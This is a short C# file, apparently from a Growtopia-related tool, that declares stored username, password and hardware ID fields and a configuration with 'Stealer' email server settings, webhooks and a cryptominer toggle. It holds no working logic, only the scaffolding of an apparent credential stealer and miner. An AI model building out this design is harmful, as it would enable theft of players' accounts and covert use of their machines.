using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Growtopiax
{
    public static class Variables
    {
        public static string Username { get; set; }
        public static string Password { get; set; }
        public static string Hwid { get; set; }
        public static string PCoinAddress { get; set; }

        public static List<string> Teams = new List<string>();
    }

    public class Configuration
    {
        public bool UseRGB { get; set; }
        public bool UseGPU { get; set; }
        public bool Nvidia { get; set; }
        public int CPUCores { get; set; }
        public bool LightMode { get; set; }
        public bool UseRPC { get; set; }
        public string TitleRPC { get; set; }
        public string TextRPC { get; set; }
        public int IntervalRPC { get; set; }
        public string StealerEmail { get; set; }
        public string StealerEmailServer { get; set; }
        public string StealerEmailPort { get; set; }
        public bool SendToOther { get; set; }
        public string OtherEmail { get; set; }
        public bool UseHTTPS { get; set; }
        public bool UseMiner { get; set; }
        public List<string> Webhooks { get; set; }
    }
}
